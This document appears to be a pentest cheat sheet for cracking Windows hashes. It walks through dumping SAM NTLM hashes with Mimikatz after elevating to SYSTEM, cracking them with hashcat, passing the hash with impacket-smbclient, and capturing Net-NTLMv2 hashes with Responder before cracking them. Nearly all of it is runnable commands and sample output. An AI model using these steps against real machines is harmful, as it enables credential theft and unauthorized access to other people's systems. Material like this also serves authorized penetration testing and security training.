### **Cracking Hashes**

### **NTLM**

**Steps**

1. Set *SeDebugPrivilege* access (needed to use Mimikatz):

```powershell
PS C:\tools> .\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

```

1. **Elevate to SYSTEM user privileges and dump credentials**

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : <DOMAIN>
SysKey : <SysKey>
Local SID : <Local SID>

RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>

```

1. **Crack the NTLM hash**

```bash
# Rule is optional
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

1. **If uncrackable, consider Pass-The-Hash**

```bash
# Pass-the-Hash using SMBClient
impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

```

### **Net-NTLMv2**

**Parameters:**

- `<interface>`: Network interface to listen on (e.g., `eth0`, `wlan0`, etc.).
- `<responder_ip>`: IP address of the machine running Responder.
- `<victim_ip>`: IP address of the victim machine.
- `<DOMAIN>`: Domain of the user.
- `<hash_file>`: File containing the captured NTLMv2 hash.

**Steps**

1. **Start Responder**: run the Responder tool to capture Net-NTLMv2 hashes. Ensure the victim requests a file that does **not** exist to generate the necessary traffic.

```bash
sudo responder -I <interface>

```

1. **Victim Request Example**: the victim's request to the Responder server can be through various services. For instance, an HTTP request might look like this:

```powershell
C:\Windows\system32> dir \\<responder_ip>\test
dir \\<responder_ip>\test
Access is denied.

```

1. **Capture Example Output**: after the victim's request, you should see output similar to this:

```bash
[SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>
[SMB] NTLMv2-SSP Username : <DOMAIN>\emma
[SMB] NTLMv2-SSP Hash     : emma::<DOMAIN>:<NTLM_HASH>

```

1. **Crack the Hash**: use Hashcat to crack the captured NTLMv2 hash. The hashcat mode for Net-NTLMv2 is `5600`.

```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
<DOMAIN>\emma::<NTLM_HASH>:123Password123
...

```
